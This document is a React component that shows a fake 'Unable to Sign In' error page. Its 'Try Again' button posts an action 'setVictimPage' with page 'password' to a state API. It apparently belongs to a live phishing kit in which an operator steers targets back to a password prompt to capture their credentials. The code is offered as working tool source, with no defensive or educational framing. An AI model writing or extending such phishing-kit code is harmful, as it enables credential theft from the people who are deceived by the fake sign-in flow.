"use client";

import { Button } from "@/components/ui/button";
import { AlertTriangle } from "lucide-react";

type ErrorStepProps = {
  errorMessage: string;
  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
}

export default function ErrorStep({ errorMessage, onInteractionEnd }: ErrorStepProps) {
  const handleTryAgain = async () => {
     await onInteractionEnd(async () => {
        try {
        await fetch('/api/state', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'setVictimPage', page: 'password' }),
        });
        } catch (error) {
        console.error('Failed to proceed');
        }
    });
  };
  
  return (
    <div className="w-full text-center">
      <AlertTriangle className="mx-auto h-12 w-12 text-destructive mb-4" />
      <h1 className="text-2xl font-normal text-destructive">Unable to Sign In</h1>
      <p className="mt-4 text-sm text-muted-foreground">
        {errorMessage || "An unknown error occurred. Please check your connection and try again."}
      </p>

      <div className="mt-8">
        <Button onClick={handleTryAgain} className="w-full">
          Try Again
        </Button>
      </div>
    </div>
  );
}
